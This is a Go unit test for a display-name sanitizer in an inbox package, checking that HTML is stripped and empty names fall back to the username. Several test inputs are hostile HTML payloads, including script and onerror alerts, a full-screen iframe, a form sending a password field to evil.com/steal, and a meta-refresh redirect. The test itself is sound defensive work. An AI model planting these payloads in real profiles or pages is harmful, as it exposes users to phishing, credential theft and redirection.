package inbox

import (
	"testing"
)

func TestSanitizeActorName(t *testing.T) {
	tests := []struct {
		name        string
		displayName string
		username    string
		expected    string
	}{
		{
			name:        "plain display name",
			displayName: "Alice",
			username:    "alice",
			expected:    "Alice",
		},
		{
			name:        "display name with emoji",
			displayName: "Alice 🦊",
			username:    "alice",
			expected:    "Alice 🦊",
		},
		{
			name:        "display name with unicode",
			displayName: "Ålice Böb",
			username:    "alice",
			expected:    "Ålice Böb",
		},
		{
			name:        "empty display name falls back to username",
			displayName: "",
			username:    "alice",
			expected:    "alice",
		},
		{
			name:        "script tag in display name",
			displayName: `<script>alert("xss")</script>`,
			username:    "alice",
			expected:    "alice",
		},
		{
			name:        "iframe injection in display name",
			displayName: `<iframe src="https://evil.com" style="position:fixed;top:0;left:0;width:100%;height:100%"></iframe>`,
			username:    "alice",
			expected:    "alice",
		},
		{
			name:        "img tag in display name",
			displayName: `<img src="https://evil.com/track.png">`,
			username:    "alice",
			expected:    "alice",
		},
		{
			name:        "form injection in display name",
			displayName: `<form action="https://evil.com/steal"><input name="pw" type="password"></form>`,
			username:    "alice",
			expected:    "alice",
		},
		{
			name:        "meta refresh in display name",
			displayName: `<meta http-equiv="refresh" content="0;url=https://evil.com">`,
			username:    "alice",
			expected:    "alice",
		},
		{
			name:        "mixed text and HTML in display name",
			displayName: `Alice <script>alert(1)</script> Bob`,
			username:    "alice",
			expected:    "Alice  Bob",
		},
		{
			name:        "custom emoji HTML in display name",
			displayName: `Alice :blobcat: <img src="https://instance.com/emoji/blobcat.png" class="custom-emoji">`,
			username:    "alice",
			expected:    "Alice :blobcat: ",
		},
		{
			name:        "HTML in both display name and username",
			displayName: `<script>alert(1)</script>`,
			username:    `<b>alice</b>`,
			expected:    "alice",
		},
		{
			name:        "entirely HTML display name falls back to username",
			displayName: `<div></div>`,
			username:    "alice",
			expected:    "alice",
		},
		{
			name:        "style tag in display name",
			displayName: `<style>body{display:none}</style>Alice`,
			username:    "alice",
			expected:    "Alice",
		},
		{
			name:        "nested HTML tags",
			displayName: `<div><span><a href="https://evil.com">Click me</a></span></div>`,
			username:    "alice",
			expected:    "Click me",
		},
		{
			name:        "event handler attributes",
			displayName: `<img src=x onerror="alert(1)">Alice`,
			username:    "alice",
			expected:    "Alice",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sanitizeActorName(tt.displayName, tt.username)
			if result != tt.expected {
				t.Errorf("sanitizeActorName(%q, %q) = %q, want %q", tt.displayName, tt.username, result, tt.expected)
			}
		})
	}
}
